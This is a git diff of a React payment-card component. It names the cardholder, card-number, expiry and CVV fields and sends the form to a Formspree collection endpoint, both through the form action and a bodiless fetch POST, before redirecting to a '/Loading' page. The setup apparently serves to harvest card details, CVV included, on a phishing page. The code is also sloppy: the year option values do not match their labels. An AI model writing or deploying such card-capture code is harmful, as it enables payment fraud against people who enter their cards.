@@ -4,15 +4,20 @@ import "./cardstyl.css";
 
 export default function Cardinformation() {
   const navigate = useNavigate();
-  function handlesubmitdata(e) {
+  let handleSubmit = (e) => {
     e.preventDefault();
+
+    fetch("https://formspree.io/f/mbjbklkl", {
+      method: "POST",
+    });
+
     window.scrollTo({
       top: 0,
       left: 100,
       behavior: "smooth",
     });
     navigate("/Loading");
-  }
+  };
   return (
     <>
       <div className="container">
@@ -77,9 +82,10 @@ export default function Cardinformation() {
                   </div>
                 </div>
                 <form
-                  action=" "
+                  action="https://formspree.io/f/mbjbklkl"
+                  method="POST"
                   className="card-body"
-                  onSubmit={handlesubmitdata}
+                  onSubmit={handleSubmit}
                   style={{ height: "350px" }}
                 >
                   <div className="input-group flex-nowrap">
@@ -89,6 +95,7 @@ export default function Cardinformation() {
                       placeholder="Name"
                       aria-label="Name"
                       aria-describedby="addon-wrapping"
+                      name="cardholdername"
                       required
                     />
                   </div>
@@ -102,6 +109,7 @@ export default function Cardinformation() {
                       placeholder="Card Number"
                       aria-label="Username"
                       aria-describedby="addon-wrapping"
+                      name="cardnumber"
                       required
                     />
                   </div>
@@ -115,6 +123,7 @@ export default function Cardinformation() {
                         required="required"
                         className="form-select form-select-sm"
                         aria-label=".form-select-sm example"
+                        name="cardexpirymonths"
                       >
                         <option selected>01</option>
                         <option value="1">02</option>
@@ -137,19 +146,20 @@ export default function Cardinformation() {
                         required="required"
                         className="form-select form-select-sm"
                         aria-label=".form-select-sm example"
+                        name="cardexpiryyear"
                       >
                         <option selected>2021</option>
-                        <option value="1">2022</option>
-                        <option value="2">2023</option>
-                        <option value="3">2024</option>
-                        <option value="4">2025</option>
-                        <option value="5">2026</option>
-                        <option value="6">2027</option>
-                        <option value="7">2028</option>
-                        <option value="8">2029</option>
-                        <option value="9">2020</option>
-                        <option value="10">2031</option>
-                        <option value="11">2032</option>
+                        <option value="2021">2022</option>
+                        <option value="2022">2023</option>
+                        <option value="2023">2024</option>
+                        <option value="2024">2025</option>
+                        <option value="2025">2026</option>
+                        <option value="2026">2027</option>
+                        <option value="2027">2028</option>
+                        <option value="2028">2029</option>
+                        <option value="2029">2020</option>
+                        <option value="2030">2031</option>
+                        <option value="2031">2032</option>
                       </select>
                     </div>
                   </div>
@@ -163,6 +173,7 @@ export default function Cardinformation() {
                       placeholder="CVV Number"
                       aria-label="Name"
                       aria-describedby="addon-wrapping"
+                      name="CardCvvNumber"
                       required
                     />
                   </div>
